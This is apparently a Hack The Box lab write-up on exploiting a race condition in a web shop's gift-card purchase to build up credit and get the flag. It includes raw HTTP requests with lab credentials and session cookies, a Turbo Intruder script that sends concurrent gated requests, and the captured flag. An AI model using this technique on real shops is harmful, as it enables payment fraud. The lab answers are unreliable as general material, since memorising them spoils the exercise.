In this example MiniLAB from HTB we have a Web-shop that have been patched so we have 2 functions:

```
1)Base credit: 10$
2)Gifticket: 10$
3)Flag: 100$
```

To get the flag we need to have at-least 100$ so we need to:
```
1)Buy a Gifticket of value 10$ this will kill our budget
2)We will get a token id
3)The redeem will give back the credit
4)As soon we have 100 we can get the flags!
```

OBS: We have 2 options available here...
```
1)RACECondition on redeem token(might be patched as described in the description)
2)RACECondition on the giftbuyout
```

1)Let's collect 5 different cookies in burpsuite.
```
POST /login.php HTTP/1.1
Host: 83.136.252.32:53109
Content-Length: 46
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://83.136.252.32:53109
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://83.136.252.32:53109/login.php

username=htb-stdnt&password=Academy_student%21
```

2)Buy a gift-card and write-down the id
```
10$ Gift Card. Redeem the Code to increase your balance: 3569141079320718
```

3)fetch the redeem quest, send to burp turbo intruder and lastly drop the original request.
```
POST /shop.php HTTP/1.1
Host: 83.136.255.150:34113
Content-Length: 23
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://83.136.255.150:34113
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://83.136.255.150:34113/shop.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,fi;q=0.8
Cookie: PHPSESSID=%s
Connection: close6

redeem=3569141079320718
```

Script:
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for sess in ["edfkpdi42qgkp3h0tflm8diuiq", "dm1hapnh2v0qd7123mpa50cc99", "0vut55bj4ps7ctj97n4hh0guqq", "u3sv3vdihtg5r0fcfs57kl2168", "i4mjnbr1otk165qpqb7vg5k8t8"]:
        engine.queue(target.req, sess, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

4)Unfortunately this doesn't work, as stated if have been patched (we get error that the token is not valid). Which next step is to try to do same but this time with the gift-card order so we can maybe get 5 different gift-cards id?
Again we grab the request before the gift buyout and send to the turbointruder**(remember to not go all the way in to but the ticket)**.
Lastly use the request with the 5 valid **PHPSESSID** tokens..
And on 5 request sent we managed to create 2 tokens:
```
10$ Gift Card. Redeem the Code to increase your balance: 1335627807937849
10$ Gift Card. Redeem the Code to increase your balance: 4145751486992140
```

5)Perform the same task several times until you can circumvent the gift-card purchase process and generate several ID that will help your gain money to 100$
```
HTB{cc5e1efbb4e786b59684b83a370e191e}
```